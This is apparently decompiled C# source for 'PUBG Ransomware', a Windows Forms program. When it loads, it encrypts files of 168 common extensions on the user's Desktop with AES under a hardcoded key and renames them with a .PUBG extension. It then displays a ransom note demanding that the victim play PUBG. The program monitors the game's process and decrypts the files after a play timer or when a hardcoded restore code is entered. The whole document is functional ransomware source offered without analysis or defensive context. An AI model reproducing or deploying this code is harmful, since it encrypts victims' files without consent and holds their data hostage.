using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using PUBG_Ransomware.My;

namespace PUBG_Ransomware;

[DesignerGenerated]
public class Form1 : Form
{
	private int playtime;

	private int may;

	private object adf;

	private IContainer components;

	[field: AccessedThroughProperty("Label1")]
	internal virtual Label Label1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Timer Timer1
	{
		[CompilerGenerated]
		get
		{
			return _Timer1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = Timer1_Tick;
			Timer timer = _Timer1;
			if (timer != null)
			{
				timer.remove_Tick(eventHandler);
			}
			_Timer1 = value;
			timer = _Timer1;
			if (timer != null)
			{
				timer.add_Tick(eventHandler);
			}
		}
	}

	[field: AccessedThroughProperty("Label2")]
	internal virtual Label Label2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Label Label3
	{
		[CompilerGenerated]
		get
		{
			return _Label3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = Label3_Click;
			Label label = _Label3;
			if (label != null)
			{
				((Control)label).remove_Click(eventHandler);
			}
			_Label3 = value;
			label = _Label3;
			if (label != null)
			{
				((Control)label).add_Click(eventHandler);
			}
		}
	}

	[field: AccessedThroughProperty("Label4")]
	internal virtual Label Label4
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label5")]
	internal virtual Label Label5
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label6")]
	internal virtual Label Label6
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("GroupBox1")]
	internal virtual GroupBox GroupBox1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("GroupBox2")]
	internal virtual GroupBox GroupBox2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("GroupBox3")]
	internal virtual GroupBox GroupBox3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Button Button1
	{
		[CompilerGenerated]
		get
		{
			return _Button1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = Button1_Click_1;
			Button button = _Button1;
			if (button != null)
			{
				((Control)button).remove_Click(eventHandler);
			}
			_Button1 = value;
			button = _Button1;
			if (button != null)
			{
				((Control)button).add_Click(eventHandler);
			}
		}
	}

	[field: AccessedThroughProperty("TextBox1")]
	internal virtual TextBox TextBox1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("GroupBox4")]
	internal virtual GroupBox GroupBox4
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label7")]
	internal virtual Label Label7
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label8")]
	internal virtual Label Label8
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("GroupBox5")]
	internal virtual GroupBox GroupBox5
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label9")]
	internal virtual Label Label9
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("GroupBox6")]
	internal virtual GroupBox GroupBox6
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Encrypred_list")]
	public virtual ListBox Encrypred_list
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	public Form1()
	{
		((Form)this).add_Load((EventHandler)Form1_Load);
		adf = 0;
		InitializeComponent();
	}

	public static void RutinaDeCifrado(string nombre, string password, string yam)
	{
		checked
		{
			try
			{
				if (Operators.CompareString(yam, "0", false) == 0)
				{
					byte[] array = new byte[32];
					Encoding.Default.GetBytes(password).CopyTo(array, 0);
					RijndaelManaged rijndaelManaged = new RijndaelManaged
					{
						Mode = CipherMode.CBC,
						KeySize = 256,
						BlockSize = 256,
						Padding = PaddingMode.Zeros
					};
					byte[] array2 = File.ReadAllBytes(nombre);
					using (MemoryStream memoryStream = new MemoryStream())
					{
						using CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(array, array), CryptoStreamMode.Write);
						cryptoStream.Write(array2, 0, array2.Length);
						byte[] array3 = memoryStream.ToArray();
						byte[] array4 = new byte[array3.Length - 1 + 1];
						array3.CopyTo(array4, 0);
						File.WriteAllBytes(nombre, array4);
					}
					try
					{
						File.Move(nombre, nombre + ".PUBG");
						return;
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
						return;
					}
				}
				byte[] array5 = new byte[32];
				Encoding.Default.GetBytes(password).CopyTo(array5, 0);
				RijndaelManaged rijndaelManaged2 = new RijndaelManaged
				{
					Mode = CipherMode.CBC,
					KeySize = 256,
					BlockSize = 256,
					Padding = PaddingMode.Zeros
				};
				byte[] array6 = File.ReadAllBytes(nombre);
				using (MemoryStream memoryStream2 = new MemoryStream())
				{
					using CryptoStream cryptoStream2 = new CryptoStream(memoryStream2, rijndaelManaged2.CreateDecryptor(array5, array5), CryptoStreamMode.Write);
					cryptoStream2.Write(array6, 0, array6.Length);
					byte[] array7 = memoryStream2.ToArray();
					byte[] array8 = new byte[array7.Length - 1 + 1];
					array7.CopyTo(array8, 0);
					File.WriteAllBytes(nombre, array8);
				}
				try
				{
					object obj = Strings.Split(nombre, ".PUBG", -1, (CompareMethod)0);
					File.Move(nombre, Conversions.ToString(NewLateBinding.LateIndexGet(obj, new object[1] { 0 }, (string[])null)));
				}
				catch (Exception projectError2)
				{
					ProjectData.SetProjectError(projectError2);
					ProjectData.ClearProjectError();
				}
			}
			catch (Exception projectError3)
			{
				ProjectData.SetProjectError(projectError3);
				ProjectData.ClearProjectError();
			}
		}
	}

	public static IEnumerable<string> BusarArchivos(string ruta, IEnumerable<string> mExtesiones)
	{
		IEnumerable<string> result = default(IEnumerable<string>);
		try
		{
			result = (from mArchivos in Directory.GetFiles(ruta, "*", SearchOption.AllDirectories)
				where mExtesiones.Contains(Path.GetExtension(mArchivos)!.ToLower())
				select mArchivos).ToList();
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return result;
		}
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		Label1.set_Text("PUBG Ransomware");
		Timer1.set_Interval(1000);
		Timer1.Start();
		object obj = Strings.Split(MyProject.User.get_Name(), "\\", -1, (CompareMethod)0);
		IEnumerable<string> mExtesiones = new string[168]
		{
			".3dm", ".3g2", ".3gp", ".aaf", ".accdb", ".aep", ".aepx", ".aet", ".ai", ".aif",
			".arw", ".as", ".as3", ".asf", ".asp", ".asx", ".avi", ".bay", ".bmp", ".cdr",
			".cer", ".class", ".cpp", ".cr2", ".crt", ".crw", ".cs", ".csv", ".db", ".dbf",
			".dcr", ".der", ".dng", ".doc", ".docb", ".docm", ".docx", ".dot", ".dotm", ".dotx",
			".dwg", ".dxf", ".dxg", ".efx", ".eps", ".erf", ".fla", ".flv", ".idml", ".iff",
			".indb", ".indd", ".indl", ".indt", ".inx", ".jar", ".java", ".jpeg", ".jpg", ".kdc",
			".m3u", ".m3u8", ".m4u", ".max", ".mdb", ".mdf", ".mef", ".mid", ".mov", ".mp3",
			".mp4", ".mpa", ".mpeg", ".mpg", ".mrw", ".msg", ".nef", ".nrw", ".odb", ".odc",
			".odm", ".odp", ".ods", ".odt", ".orf", ".p12", ".p7b", ".p7c", ".pdb", ".pdf",
			".pef", ".pem", ".pfx", ".php", ".plb", ".pmd", ".pot", ".potm", ".potx", ".ppam",
			".ppj", ".pps", ".ppsm", ".ppsx", ".ppt", ".pptm", ".pptx", ".prel", ".prproj", ".ps",
			".psd", ".pst", ".ptx", ".r3d", ".ra", ".raf", ".rar", ".raw", ".rb", ".rtf",
			".rw2", ".rwl", ".sdf", ".sldm", ".sldx", ".sql", ".sr2", ".srf", ".srw", ".svg",
			".swf", ".tif", ".vcf", ".vob", ".wav", ".wb2", ".wma", ".wmv", ".wpd", ".wps",
			".x3f", ".xla", ".xlam", ".xlk", ".xll", ".xlm", ".xls", ".xlsb", ".xlsm", ".xlsx",
			".xlt", ".xltm", ".xltx", ".xlw", ".xml", ".xqx", ".zip", ".txt", ".png", ".contact",
			".sln", ".c", ".cpp", ".cs", ".vb", ".vegas", ".uproject", ".egg"
		};
		string ruta = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"C:\\Users\\", NewLateBinding.LateIndexGet(obj, new object[1] { 1 }, (string[])null)), (object)"\\Desktop"));
		try
		{
			foreach (string item in BusarArchivos(ruta, mExtesiones))
			{
				RutinaDeCifrado(item, "GBUPRansomware", Conversions.ToString(0));
				Encrypred_list.get_Items().Add((object)("Encrypted : " + item));
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void Timer1_Tick(object sender, EventArgs e)
	{
		//IL_0169: Unknown result type (might be due to invalid IL or missing references)
		Process[] processesByName = Process.GetProcessesByName("TslGame");
		checked
		{
			if (processesByName.Length == 0)
			{
				Label1.set_Text("Wait For Game...");
				playtime = Conversions.ToInteger("0");
			}
			else
			{
				playtime++;
				may = playtime;
				Label1.set_Text("You are playing game now!");
				Label4.set_Text(Conversions.ToString(may));
			}
			if ((double)playtime != Conversions.ToDouble("3"))
			{
				return;
			}
			Timer1.Stop();
			object obj = Strings.Split(MyProject.User.get_Name(), "\\", -1, (CompareMethod)0);
			IEnumerable<string> mExtesiones = new string[1] { ".pubg" };
			string ruta = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"C:\\Users\\", NewLateBinding.LateIndexGet(obj, new object[1] { 1 }, (string[])null)), (object)"\\Desktop"));
			try
			{
				foreach (string item in BusarArchivos(ruta, mExtesiones))
				{
					RutinaDeCifrado(item, "GBUPRansomware", Conversions.ToString(1));
					Encrypred_list.get_Items().Add((object)("Decrypted : " + item));
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			Interaction.MsgBox((object)"Your Files are all Decrypted!!", (MsgBoxStyle)0, (object)null);
			((Form)this).Close();
		}
	}

	private void Button1_Click_1(object sender, EventArgs e)
	{
		//IL_00eb: Unknown result type (might be due to invalid IL or missing references)
		//IL_0100: Unknown result type (might be due to invalid IL or missing references)
		if (Operators.CompareString(TextBox1.get_Text(), "s2acxx56a2sae5fjh5k2gb5s2e", false) == 0)
		{
			object obj = Strings.Split(MyProject.User.get_Name(), "\\", -1, (CompareMethod)0);
			IEnumerable<string> mExtesiones = new string[1] { ".pubg" };
			string ruta = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"C:\\Users\\", NewLateBinding.LateIndexGet(obj, new object[1] { 1 }, (string[])null)), (object)"\\Desktop"));
			try
			{
				foreach (string item in BusarArchivos(ruta, mExtesiones))
				{
					RutinaDeCifrado(item, "GBUPRansomware", Conversions.ToString(1));
					Encrypred_list.get_Items().Add((object)("Decrypted : " + item));
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			Interaction.MsgBox((object)"Your Files are all Decrypted!!", (MsgBoxStyle)0, (object)null);
			((Form)this).Close();
		}
		else
		{
			Interaction.MsgBox((object)"amm... sorry! Try agian!", (MsgBoxStyle)0, (object)null);
		}
	}

	private void Label3_Click(object sender, EventArgs e)
	{
		if (Operators.ConditionalCompareObjectEqual(adf, (object)15, false))
		{
			((Control)TextBox1).set_Enabled(true);
			((Control)Button1).set_Enabled(true);
		}
		else
		{
			adf = Operators.AddObject(adf, (object)1);
		}
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_004d: Expected O, but got Unknown
		//IL_004e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0058: Expected O, but got Unknown
		//IL_0059: Unknown result type (might be due to invalid IL or missing references)
		//IL_0063: Expected O, but got Unknown
		//IL_0064: Unknown result type (might be due to invalid IL or missing references)
		//IL_006e: Expected O, but got Unknown
		//IL_006f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0079: Expected O, but got Unknown
		//IL_007a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0084: Expected O, but got Unknown
		//IL_0085: Unknown result type (might be due to invalid IL or missing references)
		//IL_008f: Expected O, but got Unknown
		//IL_0090: Unknown result type (might be due to invalid IL or missing references)
		//IL_009a: Expected O, but got Unknown
		//IL_009b: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a5: Expected O, but got Unknown
		//IL_00a6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b0: Expected O, but got Unknown
		//IL_00b1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00bb: Expected O, but got Unknown
		//IL_00bc: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c6: Expected O, but got Unknown
		//IL_00c7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d1: Expected O, but got Unknown
		//IL_00d2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00dc: Expected O, but got Unknown
		//IL_00dd: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e7: Expected O, but got Unknown
		//IL_00e8: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f2: Expected O, but got Unknown
		//IL_0124: Unknown result type (might be due to invalid IL or missing references)
		//IL_012e: Expected O, but got Unknown
		//IL_01b6: Unknown result type (might be due to invalid IL or missing references)
		//IL_01c0: Expected O, but got Unknown
		//IL_0256: Unknown result type (might be due to invalid IL or missing references)
		//IL_0260: Expected O, but got Unknown
		//IL_02f9: Unknown result type (might be due to invalid IL or missing references)
		//IL_0303: Expected O, but got Unknown
		//IL_039c: Unknown result type (might be due to invalid IL or missing references)
		//IL_03a6: Expected O, but got Unknown
		//IL_043f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0449: Expected O, but got Unknown
		//IL_0755: Unknown result type (might be due to invalid IL or missing references)
		//IL_075f: Expected O, but got Unknown
		//IL_07f5: Unknown result type (might be due to invalid IL or missing references)
		//IL_07ff: Expected O, but got Unknown
		//IL_08fd: Unknown result type (might be due to invalid IL or missing references)
		//IL_0907: Expected O, but got Unknown
		//IL_09f9: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a03: Expected O, but got Unknown
		//IL_0ac3: Unknown result type (might be due to invalid IL or missing references)
		//IL_0acd: Expected O, but got Unknown
		components = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		Label1 = new Label();
		Timer1 = new Timer(components);
		Label2 = new Label();
		Label3 = new Label();
		Label4 = new Label();
		Label5 = new Label();
		Label6 = new Label();
		GroupBox1 = new GroupBox();
		GroupBox2 = new GroupBox();
		GroupBox3 = new GroupBox();
		Button1 = new Button();
		TextBox1 = new TextBox();
		GroupBox4 = new GroupBox();
		Label7 = new Label();
		Label8 = new Label();
		GroupBox5 = new GroupBox();
		Label9 = new Label();
		GroupBox6 = new GroupBox();
		Encrypred_list = new ListBox();
		((Control)this).SuspendLayout();
		Label1.set_AutoSize(true);
		((Control)Label1).set_BackColor(Color.Transparent);
		((Control)Label1).set_Font(new Font("Impact", 20f));
		((Control)Label1).set_ForeColor(Color.Gold);
		((Control)Label1).set_Location(new Point(146, 443));
		((Control)Label1).set_Name("Label1");
		((Control)Label1).set_Size(new Size(0, 34));
		((Control)Label1).set_TabIndex(0);
		Label2.set_AutoSize(true);
		((Control)Label2).set_BackColor(Color.Transparent);
		((Control)Label2).set_Font(new Font("YiSunShin Dotum B", 48f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Label2).set_ForeColor(Color.White);
		((Control)Label2).set_Location(new Point(112, 9));
		((Control)Label2).set_Name("Label2");
		((Control)Label2).set_Size(new Size(614, 64));
		((Control)Label2).set_TabIndex(1);
		Label2.set_Text("PUBG Ransomware");
		Label3.set_AutoSize(true);
		((Control)Label3).set_BackColor(Color.Transparent);
		((Control)Label3).set_Font(new Font("Microsoft Sans Serif", 20.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Label3).set_ForeColor(Color.Red);
		((Control)Label3).set_Location(new Point(12, 443));
		((Control)Label3).set_Name("Label3");
		((Control)Label3).set_Size(new Size(153, 31));
		((Control)Label3).set_TabIndex(2);
		Label3.set_Text("STATUS : ");
		Label4.set_AutoSize(true);
		((Control)Label4).set_BackColor(Color.Transparent);
		((Control)Label4).set_Font(new Font("Arial Rounded MT Bold", 15f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)Label4).set_ForeColor(Color.White);
		((Control)Label4).set_Location(new Point(715, 398));
		((Control)Label4).set_Name("Label4");
		((Control)Label4).set_Size(new Size(22, 23));
		((Control)Label4).set_TabIndex(3);
		Label4.set_Text("0");
		Label5.set_AutoSize(true);
		((Control)Label5).set_BackColor(Color.Transparent);
		((Control)Label5).set_Font(new Font("Arial Rounded MT Bold", 15f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)Label5).set_ForeColor(Color.White);
		((Control)Label5).set_Location(new Point(767, 397));
		((Control)Label5).set_Name("Label5");
		((Control)Label5).set_Size(new Size(65, 23));
		((Control)Label5).set_TabIndex(4);
		Label5.set_Text("Sec...");
		Label6.set_AutoSize(true);
		((Control)Label6).set_BackColor(Color.Transparent);
		((Control)Label6).set_Font(new Font("Arial Rounded MT Bold", 15f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)Label6).set_ForeColor(Color.White);
		((Control)Label6).set_Location(new Point(594, 396));
		((Control)Label6).set_Name("Label6");
		((Control)Label6).set_Size(new Size(129, 23));
		((Control)Label6).set_TabIndex(5);
		Label6.set_Text("You Played :");
		((Control)GroupBox1).set_BackColor(Color.White);
		((Control)GroupBox1).set_Location(new Point(-17, 430));
		((Control)GroupBox1).set_Name("GroupBox1");
		((Control)GroupBox1).set_Size(new Size(894, 10));
		((Control)GroupBox1).set_TabIndex(6);
		GroupBox1.set_TabStop(false);
		((Control)GroupBox2).set_BackColor(Color.White);
		((Control)GroupBox2).set_Location(new Point(-32, 378));
		((Control)GroupBox2).set_Name("GroupBox2");
		((Control)GroupBox2).set_Size(new Size(912, 10));
		((Control)GroupBox2).set_TabIndex(7);
		GroupBox2.set_TabStop(false);
		((Control)GroupBox3).set_BackColor(Color.White);
		((Control)GroupBox3).set_Location(new Point(-21, 72));
		((Control)GroupBox3).set_Name("GroupBox3");
		((Control)GroupBox3).set_Size(new Size(904, 10));
		((Control)GroupBox3).set_TabIndex(8);
		GroupBox3.set_TabStop(false);
		((Control)Button1).set_Enabled(false);
		((Control)Button1).set_Location(new Point(469, 398));
		((Control)Button1).set_Name("Button1");
		((Control)Button1).set_Size(new Size(75, 23));
		((Control)Button1).set_TabIndex(9);
		((ButtonBase)Button1).set_Text("Restore");
		((ButtonBase)Button1).set_UseVisualStyleBackColor(true);
		((Control)TextBox1).set_Enabled(false);
		((TextBoxBase)TextBox1).set_ForeColor(Color.Gold);
		((Control)TextBox1).set_Location(new Point(122, 399));
		((Control)TextBox1).set_Name("TextBox1");
		((Control)TextBox1).set_Size(new Size(341, 20));
		((Control)TextBox1).set_TabIndex(10);
		((Control)GroupBox4).set_BackColor(Color.White);
		((Control)GroupBox4).set_Location(new Point(570, 379));
		((Control)GroupBox4).set_Name("GroupBox4");
		((Control)GroupBox4).set_Size(new Size(10, 56));
		((Control)GroupBox4).set_TabIndex(11);
		GroupBox4.set_TabStop(false);
		Label7.set_AutoSize(true);
		((Control)Label7).set_BackColor(Color.Transparent);
		((Control)Label7).set_Font(new Font("Algerian", 9.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Label7).set_ForeColor(Color.White);
		((Control)Label7).set_Location(new Point(6, 401));
		((Control)Label7).set_Name("Label7");
		((Control)Label7).set_Size(new Size(121, 15));
		((Control)Label7).set_TabIndex(12);
		Label7.set_Text("Restore Code : ");
		Label8.set_AutoSize(true);
		((Control)Label8).set_BackColor(Color.Transparent);
		((Control)Label8).set_Font(new Font("Bernard MT Condensed", 18f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Label8).set_ForeColor(Color.Red);
		((Control)Label8).set_Location(new Point(132, 88));
		((Control)Label8).set_Name("Label8");
		((Control)Label8).set_Size(new Size(559, 56));
		((Control)Label8).set_TabIndex(13);
		Label8.set_Text("Your files, images, musics, documents are Encrypted!\r\n\r\n");
		((Control)GroupBox5).set_BackColor(Color.White);
		((Control)GroupBox5).set_Location(new Point(-22, 125));
		((Control)GroupBox5).set_Name("GroupBox5");
		((Control)GroupBox5).set_Size(new Size(905, 10));
		((Control)GroupBox5).set_TabIndex(14);
		GroupBox5.set_TabStop(false);
		Label9.set_AutoSize(true);
		((Control)Label9).set_BackColor(Color.Transparent);
		((Control)Label9).set_Font(new Font("Ravie", 14.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Label9).set_ForeColor(Color.DeepSkyBlue);
		((Control)Label9).set_Location(new Point(62, 183));
		((Control)Label9).set_Name("Label9");
		((Control)Label9).set_Size(new Size(728, 130));
		((Control)Label9).set_TabIndex(15);
		Label9.set_Text("Your files is encrypred by PUBG Ransomware!\r\nbut don't worry! It is not hard to unlock it.\r\nI don't want money!\r\nJust play PUBG 1Hours!\r\nOr Restore code is [ s2acxx56a2sae5fjh5k2gb5s2e ]\r\n");
		Label9.set_TextAlign((ContentAlignment)32);
		((Control)GroupBox6).set_BackColor(Color.White);
		((Control)GroupBox6).set_Location(new Point(874, -11));
		((Control)GroupBox6).set_Name("GroupBox6");
		((Control)GroupBox6).set_Size(new Size(10, 497));
		((Control)GroupBox6).set_TabIndex(16);
		GroupBox6.set_TabStop(false);
		Encrypred_list.set_Font(new Font("Microsoft Sans Serif", 10f));
		((ListControl)Encrypred_list).set_FormattingEnabled(true);
		Encrypred_list.set_ItemHeight(16);
		Encrypred_list.get_Items().AddRange(new object[2] { "Encrypted, Decrypted List", "=========================" });
		((Control)Encrypred_list).set_Location(new Point(882, 0));
		((Control)Encrypred_list).set_Name("Encrypred_list");
		Encrypred_list.set_ScrollAlwaysVisible(true);
		((Control)Encrypred_list).set_Size(new Size(283, 484));
		((Control)Encrypred_list).set_TabIndex(17);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackgroundImage((Image)componentResourceManager.GetObject("$this.BackgroundImage"));
		((Control)this).set_BackgroundImageLayout((ImageLayout)3);
		((Form)this).set_ClientSize(new Size(1163, 477));
		((Control)this).get_Controls().Add((Control)(object)Encrypred_list);
		((Control)this).get_Controls().Add((Control)(object)GroupBox6);
		((Control)this).get_Controls().Add((Control)(object)Label9);
		((Control)this).get_Controls().Add((Control)(object)GroupBox5);
		((Control)this).get_Controls().Add((Control)(object)Label8);
		((Control)this).get_Controls().Add((Control)(object)TextBox1);
		((Control)this).get_Controls().Add((Control)(object)Button1);
		((Control)this).get_Controls().Add((Control)(object)GroupBox3);
		((Control)this).get_Controls().Add((Control)(object)GroupBox1);
		((Control)this).get_Controls().Add((Control)(object)Label5);
		((Control)this).get_Controls().Add((Control)(object)Label4);
		((Control)this).get_Controls().Add((Control)(object)Label1);
		((Control)this).get_Controls().Add((Control)(object)Label3);
		((Control)this).get_Controls().Add((Control)(object)Label2);
		((Control)this).get_Controls().Add((Control)(object)Label6);
		((Control)this).get_Controls().Add((Control)(object)GroupBox4);
		((Control)this).get_Controls().Add((Control)(object)Label7);
		((Control)this).get_Controls().Add((Control)(object)GroupBox2);
		((Form)this).set_FormBorderStyle((FormBorderStyle)2);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Form1");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
